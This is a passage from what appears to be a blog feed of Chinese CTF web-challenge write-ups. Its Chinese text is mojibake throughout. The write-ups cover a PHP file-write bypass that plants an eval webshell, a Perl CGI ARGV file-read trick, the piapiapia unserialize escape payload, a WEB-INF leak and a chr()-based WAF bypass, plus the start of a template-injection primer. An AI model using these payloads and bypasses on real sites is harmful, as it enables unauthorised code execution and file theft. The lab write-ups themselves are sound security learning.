class="line">mysql_real_escape_stringï¼ˆ ï¼‰å‡½æ•°ä¼šåœ¨å•å¼•å·å‰åŠ \ä¾æ¬¡æ¥é˜²æ­¢sqlæ³¨å…¥</span><br><span class="line"><span class="comment">//è¿™é‡Œå¯ä»¥ç”¨1/9è¿›è¡Œç»•è¿‡</span></span><br></pre></td></tr></table></figure><p>è¿‡äº†è¿™ä¸€æ­¥æ¥çœ‹ä¸‹ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">       $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">       $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">       $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">           $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">           fwrite($f, $con);</span><br><span class="line">           fclose($f);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$filename = <span class="string">"backup/"</span>.$file;<span class="comment">//backupæ˜¯ä¼ªè·¯å¾„ï¼Œè¿™é‡Œç”¨../å¯ä»¥ç»•è¿‡</span></span><br><span class="line">preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename)<span class="comment">//è¿™ä¸€æ®µæ­£åˆ™çœŸçš„æ²¡çœ‹æ‡‚ï¼Œçœ‹äº†å¤§ä½¬çš„wpè¯´æ˜¯åªè¿‡æ»¤åœ¨æœ€åä¸€ä¸ªç‚¹çš„åç¼€ï¼Œå¯ä»¥ç”¨/.æˆ–è€…ä¸¤ä¸ª.phpæ–‡ä»¶æ¥ç»•è¿‡</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:file=../<span class="number">4.</span>php/.&amp;con=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®uploaded/4.php</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/15.png" class="" title="examplename"><p>ç”¨systemæ¥çˆ†å‡ºè·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æœ‰flag.php,ç”¨catæ¥è¯»å–ï¼Œåœ¨ç½‘é¡µæºç å¯ä»¥çœ‹åˆ°flag</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ç”¨èœåˆ€è¿æ¥ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/14.png" class="" title="examplename"><h4 id="0X08i-got-id-20-03-18"><a href="#0X08i-got-id-20-03-18" class="headerlink" title="0X08i-got-id 20-03-18"></a>0X08i-got-id 20-03-18</h4><p>æ‰“å¼€æœ‰ä¸‰ä¸ªè·³è½¬é“¾æ¥ï¼Œå…¶ä¸­ä¸€ä¸ªæç¤ºæ˜¯Perlï¼Œæœ‰ä¸€ä¸ªæ˜¯æ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œåº”è¯¥æ˜¯Perlæ–‡ä»¶ä¸Šä¼ ï¼Œå»ç™¾åº¦äº†ä»¥ä¸‹æœ‰å…³çš„çŸ¥è¯†ï¼ŒçŒœæµ‹ä¸€ä¸‹åå°çš„é€»è¾‘</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> $cgi=CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span>($cgi-&gt;upload(<span class="string">'file'</span>))&#123;</span><br><span class="line"><span class="keyword">my</span> $file=$cgi-&gt;param(<span class="string">'file'</span>);</span><br><span class="line"><span class="keyword">while</span> (&lt;$file&gt;)&#123;<span class="keyword">print</span> <span class="string">"$_"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">param()å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥åˆ°ä¸‹é¢çš„fileå˜é‡ä¸­ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚å¯¹æ­£å¸¸çš„ä¸Šä¼ æ–‡ä»¶è¿›è¡Œä¿®æ”¹,å¯ä»¥è¾¾åˆ°è¯»å–ä»»æ„æ–‡ä»¶çš„ç›®çš„</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¸Šä¼ ä¸€ä¸ªargvæ–‡ä»¶å†ä¸Šä¼ æ­£å¸¸çš„æ–‡ä»¶ï¼Œç”¨bashæ¥è¯»å–ç›®å½•</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/16.png" class="" title="examplename"><p>æ¥ç€ç›´æ¥è¯»å–/flagï¼Œå°±å¯ä»¥äº†</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0X01-FlatScience-20-03-11&quot;&gt;&lt;a href=&quot;#0X01-FlatScience-20-03-11&quot; class=&quot;headerlink&quot; title=&quot;0X01: FlatScience 20-03-11&quot;&gt;&lt;/a&gt;0X01: FlatScience 20-03-11
    
    </summary>
    
    
    
      <category term="train" scheme="http://yoursite.com/tags/train/"/>
    
  </entry>
  
  <entry>
    <title>buuojdiary</title>
    <link href="http://yoursite.com/2020/02/26/buuojdiary/"/>
    <id>http://yoursite.com/2020/02/26/buuojdiary/</id>
    <published>2020-02-26T07:58:32.000Z</published>
    <updated>2020-05-18T00:35:17.630Z</updated>
    
    <content type="html"><![CDATA[<p>[0CTF piapiapia]<a id="more"></a></p><p>å‰å‡ å¤©iæ˜¥ç§‹çš„æ¯”èµ›é‡Œé¢æœ‰ä¸€é“ååºåˆ—åŒ–é€ƒé€¸çš„é¢˜ç›®ï¼Œå¯¹äºèœé¸¡è€Œè¨€çœŸçš„æ˜¯ä¸€è„¸æ‡µé€¼ï¼Œåæ¥çœ‹äº†å‡ºé¢˜äººçš„å‡ºé¢˜ç¬”è®°ï¼Œæ‰¾åˆ°äº†è¿™é“é¢˜ï¼ŒåºŸè¯ä¸å¤šè¯´ï¼Œè¿›å…¥æ­£é¢˜ã€‚</p><p>åˆ†æï¼šæ‰«æç›®å½•ï¼Œå¯ä»¥ä»è¿”å›ä¸­æ‰¾åˆ°<a href="http://www.zipï¼Œä»è€Œèƒ½å¤Ÿå¾—åˆ°ç½‘ç«™çš„é€»è¾‘å’Œæºç " target="_blank" rel="noopener">www.zipï¼Œä»è€Œèƒ½å¤Ÿå¾—åˆ°ç½‘ç«™çš„é€»è¾‘å’Œæºç </a></p><p>(1)æ³¨å†Œ (2)ç™»å½• (3)ä¿®æ”¹ä¿¡æ¯</p><p>config.phpä¸­å†…å®¹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¤§æ¦‚çŸ¥é“äº†éœ€è¦è¯»å–config.phpæ¥æ‹¿åˆ°flag</p><p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹profile.phpæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure><p>ä»ä»£ç æ¥çœ‹,æ‰€è¦åšçš„åº”è¯¥å°±æ˜¯è®©$profile[â€˜photoâ€™]=â€™profile.phpâ€™ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªååºåˆ—åŒ–ï¼Œé‚£ä¹ˆåº”è¯¥å°±æ˜¯è¦åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´æ¥è¯»å–profile.phpï¼Œè¿™æ ·å°±èƒ½å¾—åˆ°base64åŠ å¯†è¿‡çš„ä¿¡æ¯</p><p>å†æ¥çœ‹update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºphoneã€emailã€nacknameã€photoéƒ½æ˜¯å¯ä»¥è¿›è¡Œæ“ä½œçš„</p><p>åœ¨è®¾ç½®äº†profileçš„ä¿¡æ¯ä¹‹åä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨filteræ–¹æ³•ä¸­è¿›è¡Œäº†è¿‡æ»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ä¸œè¥¿ï¼Œå°±æ˜¯æ ¹æ®æ ‘å“¥çš„blogæ¥åšçš„ï¼Œæ ¹æ®é‚£ç¯‡æ–‡ç« è¿™é“é¢˜çš„ç‚¹åº”è¯¥åœ¨nicknameè¿™é‡Œ,å¯ä»¥çœ‹åˆ°filterä¸­ä¼šç”¨hackeræ¥æ›¿ä»£æ•°ç»„é‡Œçš„ä¸œè¥¿ï¼Œä¹Ÿå°±æœ‰whereçš„åœ°æ–¹å°±ä¼šæŒ¤å‡ºå­—ç¬¦</p><p>ç¬¬ä¸€ä¸ªé•¿åº¦é™åˆ¶å¯ä»¥ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡,ä¹Ÿå°±æ˜¯nickname[]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ¥çœ‹ä¸€ä¸‹æ­£å¸¸åºåˆ—åŒ–çš„ç»“æœ:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">Array</span>(</span><br><span class="line"> <span class="string">'phone'</span> =&gt; <span class="string">'12345678911'</span>,</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'woc2@qq.com'</span>,</span><br><span class="line">    <span class="string">'nickname'</span> =&gt; [<span class="string">'hello'</span>],</span><br><span class="line">    <span class="string">'photo'</span> =&gt; <span class="string">'upload/'</span>.md5(<span class="string">'123.jpg'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//a:4&#123;s:5:"phone";s:11:"12345678911";s:5:"email";s:11:"woc2@qq.com";s:8:"nickname";a:1&#123;i:0;s:5:"hello";&#125;s:5:"photo";s:39:"upload/f47454d1d3644127f42070181a8b9afc";&#125;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨è¦åšçš„å°±æ˜¯å¾€nicknameé‡Œå¡å…¥profile.phpï¼Œç›´æ¥ç»™payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"15000000000"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"woc2@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>&#123;i:<span class="number">0</span>;s:<span class="number">204</span>:<span class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;s:<span class="number">39</span>:<span class="string">"upload/f47454d1d3644127f42070181a8b9afc"</span>;&#125;</span><br><span class="line">è¿™é‡Œ<span class="number">34</span>ä¸ªwhereåŠ ä¸Š<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;ä¸€å…±204ä¸ªå­—ç¬¦ï¼Œåœ¨filteræ–¹æ³•é‡Œ34ä¸ªwhereä¼šè¢«hackeræ›¿ä»£ï¼Œ34ä¸ªhackerå°±æœ‰204ä¸ªå­—ç¬¦æ­¤æ—¶ï¼Œ"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;ä¸å†æ˜¯ä¸€å¤§ä¸²whereçš„ä¸€éƒ¨åˆ†ï¼Œs:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>ä¹Ÿä¸æ˜¯ç®€å•çš„å­—ç¬¦ä¸²äº†ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¼šè¢«è§£ææˆprofile[<span class="string">'photo'</span>]=<span class="string">'config.php'</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±æ˜¯æ³¨å†Œç™»å½•æ›´æ–°ä¿¡æ¯ï¼Œåœ¨profile.phpä¸­æ‹¿åˆ°base64ç ï¼Œè§£å¯†æ‹¿åˆ°flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[0CTF piapiapia]
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>RoarCTF</title>
    <link href="http://yoursite.com/2020/02/19/RoarCTF/"/>
    <id>http://yoursite.com/2020/02/19/RoarCTF/</id>
    <published>2020-02-19T10:10:44.000Z</published>
    <updated>2020-03-12T01:24:46.018Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-Easy-Java"><a href="#1-Easy-Java" class="headerlink" title="1.Easy Java"></a>1.Easy Java<a id="more"></a></h4><p>æ‰“å¼€é¢˜ç›®å‡ºç°çš„æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢</p><img src="/2020/02/19/RoarCTF/java.png" class="" title="examplename"><p>ç‚¹å‡»helpå‡ºç°äº†æç¤º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure><p>ç”¨burpæŠ“åŒ…,ä½†æ˜¯æ€ä¹ˆæ”¹éƒ½æ— æ³•ä¸‹è½½æˆ–è€…æ‰“å¼€help.docxï¼Œåé¢å°è¯•æŠŠGETæ”¹æˆäº†POSTï¼ŒæˆåŠŸæ‰“å¼€äº†è¿™ä¸ªæ–‡ä»¶</p><p>ç”±äºé¢˜ç›®æ˜¯è·Ÿjavaæœ‰å…³ç³»ï¼Œå°±å»ç™¾åº¦äº†ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡å¾ˆè¯¦ç»†çš„æ–‡ç« ï¼Œè¿™é‡Œæ˜¯é‡ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF&#x2F;web.xmlæ³„éœ²</span><br><span class="line">WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ </span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>å°è¯•WEB-INF/web.xmlæ‰¾åˆ°äº†ç–‘ä¼¼flagæ–‡ä»¶çš„ä¸œè¥¿â€¦</p><img src="/2020/02/19/RoarCTF/java1.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªcom.wm.ctf.FlagController</p><p>æ„é€ payload:<code>WEB-INF/classes/com/wm.ctf.FlagController.class</code></p><img src="/2020/02/19/RoarCTF/java2.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸²base64ç¼–ç çš„å­—ç¬¦,è§£ç å³å¯å¾—åˆ°flag.</p><h4 id="2-Easy-Calc"><a href="#2-Easy-Calc" class="headerlink" title="2.Easy Calc"></a>2.Easy Calc</h4><p>æ˜¯ä¸€é“è®¡ç®—å™¨çš„é¢˜ï¼Œç›´æ¥çœ‹ç½‘é¡µæºç æ‰¾åˆ°äº†ä¸€ä¸ªå«calc.phpçš„æ–‡ä»¶ï¼Œå¯ä»¥è®¿é—®</p><img src="/2020/02/19/RoarCTF/calc.png" class="" title="examplename"><p>å¯ä»¥çœ‹å‡ºpayloadä¸­ä¸èƒ½åŒ…å«â€™ â€˜, â€˜\tâ€™, â€˜\râ€™, â€˜\nâ€™,â€™â€™â€™, â€˜â€œâ€˜, â€˜`â€™, â€˜[â€˜, â€˜]â€™ ç­‰å­—ç¬¦,è€Œä¸”å‰é¢æœ‰æç¤ºè¯´åŠ ä¸Šäº†WAF,è¿™é“é¢˜æˆ‘ä»¬å¯ä»¥ç”¨%20æ¥è¿›è¡Œç»•è¿‡WAF</p><p>æ¥ä¸‹æ¥çš„å†…å®¹æ˜¯åˆšåˆšä»ä¸€ç¯‡åšå®¢å­¦åˆ°çš„æ–°çŸ¥è¯†ï¼Œåœ¨è¿™ä¹‹å‰å¹¶ä¸çŸ¥é“(æˆ‘å¤ªèœäº†â€¦)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpçš„æ–‡ä»¶æ“ä½œå‡½æ•°ï¼š</span><br><span class="line">getcwd â€” å–å¾—å½“å‰å·¥ä½œç›®å½•</span><br><span class="line">dirname(string $path) â€” è¿”å› path çš„çˆ¶ç›®å½•</span><br><span class="line">scandir â€” åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•</span><br></pre></td></tr></table></figure><p>æœ‰äº†ä¸Šé¢çš„è¿™äº›æ“ä½œå‡½æ•°,é‚£ä¹ˆå°±çœ‹å¯ä»¥æ‰¾flagäº†â€¦</p><p>ä¸€å±‚å±‚å¾€ä¸Šæ‰¾</p><img src="/2020/02/19/RoarCTF/java3.png" class="" title="examplename"><p>åœ¨è¿™é‡Œæ‰¾åˆ°äº†f1aggçš„æ–‡ä»¶,ä½†æ˜¯/æ˜¯è¢«è¿‡æ»¤çš„,è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨<code>var_dump(file_get_contents(&#39;/f1agg&#39;));</code></p><p>æƒ³åˆ°äº†ç”¨asciiç æ¥è¿›è¡Œç»•è¿‡,ç”¨â€™.â€™æ¥è¿›è¡Œæ‹¼æ¥</p><p>payloadï¼š<code>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))ï¼›</code></p><p>é¡ºåˆ©æ‹¿åˆ°flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;1-Easy-Java&quot;&gt;&lt;a href=&quot;#1-Easy-Java&quot; class=&quot;headerlink&quot; title=&quot;1.Easy Java&quot;&gt;&lt;/a&gt;1.Easy Java
    
    </summary>
    
    
    
      <category term="something import" scheme="http://yoursite.com/tags/something-import/"/>
    
  </entry>
  
  <entry>
    <title>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥</title>
    <link href="http://yoursite.com/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2020-02-12T08:28:20.000Z</published>
    <updated>2020-03-13T09:57:17.770Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01:ç®€ä»‹"></a>0x01:ç®€ä»‹<a id="more"></a></h4><p>æ¨¡æ¿å¼•æ“ç”¨äºä½¿ç”¨åŠ¨æ€æ•°æ®å‘ˆç°å†…å®¹ã€‚æ­¤ä¸Šä¸‹æ–‡æ•°æ®é€šå¸¸ç”±ç”¨æˆ·æ§åˆ¶å¹¶ç”±æ¨¡æ¿è¿›è¡Œæ ¼å¼åŒ–ï¼Œä»¥ç”Ÿæˆç½‘é¡µã€ç”µå­é‚®ä»¶ç­‰ã€‚æ¨¡æ¿å¼•æ“é€šè¿‡ä½¿ç”¨ä»£ç æ„é€ ï¼ˆå¦‚æ¡ä»¶è¯­å¥ã€å¾ªç¯ç­‰ï¼‰å¤„ç†ä¸Šä¸‹æ–‡æ•°æ®ï¼Œå…è®¸åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨å¼ºå¤§çš„è¯­è¨€è¡¨è¾¾å¼ï¼Œä»¥å‘ˆç°åŠ¨æ€å†…å®¹ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è¦å‘ˆç°çš„æ¨¡æ¿ï¼Œåˆ™ä»–ä»¬å°†èƒ½å¤Ÿæ³¨å…¥å¯æš´éœ²ä¸Šä¸‹æ–‡æ•°æ®ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»»æ„å‘½ä»¤çš„è¡¨è¾¾å¼ã€‚</p><h4 id="0x02-æœåŠ¡ç«¯æ¨¡æ¿å¼•æ“"><a href="#0x02-æœåŠ¡ç«¯æ¨¡æ¿å¼•æ“" class="headerlink" title="0x02:æœåŠ¡ç«¯æ¨¡æ¿å¼•æ“"></a>0x02:æœåŠ¡ç«¯æ¨¡æ¿å¼•æ“</h4><p><strong>PHP</strong>ï¼šSmartyã€Twigï¼›</p><p><strong>Java</strong>ï¼šFreemarkerã€Velocityï¼›</p><p><strong>Python</strong>ï¼šJinja2ã€Tornadoã€Markoï¼›</p><p><strong>Ruby</strong>ï¼šSlimã€ERBï¼›</p><p><strong>NodeJS</strong>ï¼šJadeç­‰</p><h4 id="0x03ï¼šæ³¨å…¥æ‰‹æ³•ï¼ˆps-è¿™æ˜¯ä¸€å¼ æ‰¾æ¥çš„å›¾ç‰‡ï¼‰"><a 